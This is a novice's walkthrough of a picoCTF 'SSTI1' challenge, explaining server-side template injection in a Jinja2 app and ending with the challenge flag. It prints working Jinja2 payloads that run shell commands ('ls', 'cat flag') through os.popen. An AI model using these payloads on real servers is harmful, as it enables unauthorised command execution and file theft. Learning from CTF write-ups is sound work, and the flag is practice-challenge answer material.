# [SST11 - Server Side Template Injection (Web Exploitation)](https://play.picoctf.org/practice/challenge/492?page=1)

**Challenge Description**  
"I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:52471/)! (The website might not work as the URL changes whenever the instance is opened)

**Category**: Web Exploitation  
**Difficulty**: Easy  

## Approach

This is my first CTF and I was clueless. I got confused about what to do with the URL. I searched up SSTI and got to know what it is. I'll explain SSTI in the simplest way possible without diving too deep into technical jargon and what I generally understood in these few hours.Imagine a website that lets you type your name, and then shows a welcome message like: Hello [your-name-here]!.Normally, if you type "Alice", it shows:Hello Alice! But if the website isn't built carefully, then there's a lot of problems that can occur. I got to know about the classic payload {{7*7}} from internet and thus used it. Also, I got to know that payloads are readymade found on the internet, depending upon the type of web template engine used. We just need to know how to tweak/modify it to use for our application in this CTF challenge.

1. **Identify SSTI Vulnerability**  
   Tested with `{{7*7}}` which returned `49`, confirming template injection.

2. **Command Execution**
   I found then a payload from the [website](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/) and used Jinja2 template engine exploit:
   ```jinja2
   {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}

   This showed all the files and I found the "flag" file and thus again used "cat flag" command with little tweaking in the above command.
   ```jinja2
   {{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
   which returned me the flag-picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_73c99823}